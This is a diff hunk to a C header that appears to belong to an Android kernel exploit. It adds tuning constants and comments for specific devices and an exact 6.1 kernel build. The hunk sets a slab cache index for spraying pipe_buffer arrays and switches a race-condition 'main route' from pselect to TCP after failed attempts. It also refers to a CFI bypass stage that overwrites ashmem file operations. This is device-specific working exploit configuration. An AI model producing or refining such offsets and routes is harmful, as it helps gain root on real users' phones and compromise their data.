@@ -394,6 +394,27 @@
 #define KMALLOC_CGROUP_TYPE           1
 #define KMALLOC_CACHE_TYPES           3
 #define PIPE_BUFFER_SIZE              0x28
+// pipe_buffer arrays are PIPE_BUFFER_SLOTS * PIPE_BUFFER_SIZE = 32 * 0x28 =
+// 1280 bytes, so they come out of kmalloc-2k: index 11. Same as lynx.
+#define KMALLOC_PIPE_INDEX            11
+
+// ── main route transport (src/61) ───────────────────────────────────────
+// Use the TCP route, not pselect. The pselect main route was run to
+// exhaustion on this device: all 26 attempts reported calls=1 success=1, so
+// the race fired every time, and every one of them failed try_cfi_stage() at
+// step 4 with the ashmem f_op never overwritten. A panic captured mid-race
+// died in rt_mutex_top_waiter() reading lock->waiters.rb_leftmost — which is
+// the rb_leftmost misalignment src/61/common.h already documents for pselect
+// on 6.1, and the reason it tells 6.1 targets to override this to 1.
+#define MAIN_TCP_ROUTE_DEFAULT        1
+#define MAIN_TCP_PAYLOAD_DEFAULT      1
+
+// Distinct from slide61.c's own SLIDE_PSELECT_WORD_SHIFT (3, which this
+// device confirmed empirically): this one places the fd_set word map for the
+// pselect *main* route. lynx runs the identical kernel build
+// (6.1.157-android14-11-gbd23337e42e7-ab14791245), so the compiled stack
+// frames — and therefore this shift — are the same.
+#define PSELECT_WAITER_WORD_SHIFT     1
 
 // ── struct page / struct slab (BTF) ─────────────────────────────────────
 // DIVERGENCE: STRUCT_SLAB_CACHE_OFF is 0x08 on blazer. 6.6 hoisted
